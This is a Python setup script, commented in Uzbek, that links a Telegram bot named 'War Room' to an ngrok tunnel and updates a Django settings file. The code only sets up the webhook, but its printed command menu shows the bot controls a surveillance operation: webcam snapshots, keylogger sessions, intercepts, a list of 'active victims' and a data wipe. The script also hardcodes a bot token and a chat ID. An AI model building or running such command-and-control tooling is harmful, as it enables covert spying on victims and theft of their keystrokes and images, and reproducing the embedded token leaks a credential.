"""
Telegram Bot War Room — Webhook Setup Script
=============================================
Bu skript:
1. Ngrok tunnelni API orqali topadi
2. Telegram webhook'ini o'rnatadi
3. Bot test qiladi

Ishlatish:
  python setup_bot.py
"""

import requests
import json
import time
import sys

BOT_TOKEN = "8638904590:AAFHyLPv4NLGopvt0-4L4YktfGt73tjeXY0"
CHAT_ID = "1844215620"
WEBHOOK_PATH = "/bot/webhook/"

def get_ngrok_url():
    """Ngrok API dan public URL olish"""
    try:
        r = requests.get("http://localhost:4040/api/tunnels", timeout=5)
        tunnels = r.json().get("tunnels", [])
        for t in tunnels:
            url = t.get("public_url", "")
            if url.startswith("https://"):
                return url.rstrip("/")
        # Agar https topilmasa, http ni https ga aylantir
        for t in tunnels:
            url = t.get("public_url", "")
            if url.startswith("http://"):
                return url.replace("http://", "https://").rstrip("/")
    except Exception as e:
        print(f"❌ Ngrok API ga ulanib bo'lmadi: {e}")
        print("   → Ngrok ishga tushurilmagan bo'lishi mumkin!")
    return None

def set_webhook(ngrok_url):
    """Telegram webhook'ini o'rnatish"""
    webhook_url = f"{ngrok_url}{WEBHOOK_PATH}"
    print(f"\n📡 Webhook URL: {webhook_url}")
    
    r = requests.get(
        f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
        params={"url": webhook_url, "allowed_updates": ["message", "callback_query"]}
    )
    data = r.json()
    if data.get("ok"):
        print("✅ Webhook muvaffaqiyatli o'rnatildi!")
        return True
    else:
        print(f"❌ Webhook o'rnatishda xato: {data.get('description')}")
        return False

def get_webhook_info():
    """Hozirgi webhook ma'lumotlarini ko'rish"""
    r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getWebhookInfo")
    return r.json().get("result", {})

def delete_webhook():
    """Webhook'ni o'chirish (polling uchun)"""
    r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")
    return r.json().get("ok")

def test_bot():
    """Botga test xabar yuborish"""
    r = requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={
            "chat_id": CHAT_ID,
            "text": "✅ <b>WAR ROOM BOT — ONLINE</b>\n\nWebhook muvaffaqiyatli ulandi!\nBuyruqlar uchun /start yozing.",
            "parse_mode": "HTML"
        }
    )
    return r.json().get("ok")

def update_settings_ngrok(ngrok_url):
    """settings.py dagi NGROK_URL ni yangilash"""
    try:
        settings_path = "config/settings.py"
        with open(settings_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        import re
        new_content = re.sub(
            r"NGROK_URL = '.*?'",
            f"NGROK_URL = '{ngrok_url}'",
            content
        )
        # Also update CSRF trusted origins
        new_content = re.sub(
            r"CSRF_TRUSTED_ORIGINS = \[.*?\]",
            f"CSRF_TRUSTED_ORIGINS = ['https://*.ngrok-free.app', 'https://*.ngrok-free.dev', '{ngrok_url}']",
            new_content
        )
        with open(settings_path, "w", encoding="utf-8") as f:
            f.write(new_content)
        print(f"✅ settings.py yangilandi: NGROK_URL = '{ngrok_url}'")
    except Exception as e:
        print(f"⚠️ settings.py yangilanmadi: {e}")

if __name__ == "__main__":
    print("=" * 50)
    print("  TELEGRAM BOT WAR ROOM — WEBHOOK SETUP")
    print("=" * 50)
    
    # 1. Ngrok URL topish
    print("\n🔍 Ngrok URL qidirilmoqda...")
    ngrok_url = get_ngrok_url()
    
    if not ngrok_url:
        print("\n⚠️  Ngrok ishga tushirilmagan!")
        print("\n📌 Qadamlar:")
        print("  1. Yangi terminal oching")
        print("  2. Quyidagi buyruqni bajaring:")
        print("     ngrok http 8080")
        print("  3. URL ko'ringandan keyin bu skriptni qayta ishga tushiring")
        print("\n🔧 Yoki URL ni qo'lda kiriting:")
        ngrok_url = input("  Ngrok URL (https://xxxx.ngrok-free.app): ").strip().rstrip("/")
        if not ngrok_url.startswith("https://"):
            print("❌ URL https:// bilan boshlanishi kerak!")
            sys.exit(1)
    else:
        print(f"✅ Ngrok topildi: {ngrok_url}")
    
    # 2. Settings yangilash
    update_settings_ngrok(ngrok_url)
    
    # 3. Hozirgi webhook
    print("\n📋 Hozirgi webhook holati:")
    info = get_webhook_info()
    current = info.get("url", "yo'q")
    pending = info.get("pending_update_count", 0)
    print(f"  URL: {current}")
    print(f"  Pending updates: {pending}")
    
    # 4. Webhook o'rnatish
    print("\n⚙️  Webhook o'rnatilmoqda...")
    success = set_webhook(ngrok_url)
    
    if success:
        # 5. Test xabar
        print("\n📨 Botga test xabar yuborilmoqda...")
        if test_bot():
            print("✅ Test xabar yuborildi! Telegram'ni tekshiring.")
        else:
            print("⚠️ Test xabar yuborilmadi. CHAT_ID ni tekshiring.")
        
        print("\n" + "=" * 50)
        print("  SETUP MUVAFFAQIYATLI YAKUNLANDI!")
        print("=" * 50)
        print(f"\n🤖 Bot: @cyberalerttbot")
        print(f"📡 Webhook: {ngrok_url}{WEBHOOK_PATH}")
        print("\n📌 Buyruqlar:")
        print("  /start   — Menyu")
        print("  /stats   — Statistika")
        print("  /latest  — Oxirgi intercept'lar")
        print("  /photo   — Webcam snapshot")
        print("  /keylog  — Keylogger sessiyalar")
        print("  /victims — Active victimlar")
        print("  /wipe    — Ma'lumotlarni o'chirish")
        print("\n⚠️  ESLATMA: Ngrok yopilsa, webhook ham o'chadi!")
        print("   Har safar ngrok qayta ishga tushirilganda bu skriptni qayta bajaring.")
    else:
        print("\n❌ Setup muvaffaqiyatsiz. Bot token va ngrok URL ni tekshiring.")
